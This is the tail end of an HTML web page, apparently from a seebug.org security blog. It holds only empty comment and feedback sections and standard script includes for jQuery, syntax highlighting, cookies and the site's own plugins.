    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
